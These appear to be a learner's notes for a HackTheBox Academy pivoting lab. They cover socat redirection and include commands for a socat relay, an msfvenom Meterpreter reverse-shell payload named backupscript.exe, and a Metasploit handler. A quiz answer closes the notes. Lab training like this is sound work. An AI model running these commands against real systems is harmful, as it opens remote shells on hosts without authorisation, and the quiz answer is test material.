# Socat Redirection with a Reverse Shell

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Pivoting, Tunneling, and Port Forwarding |
| 🔗 Section | [1430](https://academy.hackthebox.com/module/158/section/1430) |

---

## 🔑 Key Concepts

- **Socat** — bidirectional relay tool, creates pipe sockets between 2 network channels
- **No SSH required** — works independently without SSH tunneling
- Acts as a **redirector** — forwards traffic from pivot host to attack host

## 🛠️ Key Commands

### Start Socat Listener on Pivot Host
```bash
socat TCP4-LISTEN:8080,fork TCP4:<attack_host_ip>:80
# Listens on port 8080, forwards to attack host port 80
```

### Generate Payload (points to pivot host)
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=<pivot_host_ip> \
  LPORT=8080 \
  -f exe -o backupscript.exe
```

### Metasploit Handler (on attack host)
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

### Flow
```
Windows Target → pivot_host:8080 → socat → attack_host:80 → Meterpreter
```

---

## ❓ Questions

### Q1 — SSH tunneling is required with Socat. True or False?
**Answer:** `False`

> Socat creates bidirectional pipe sockets between network channels **without needing SSH tunneling**.
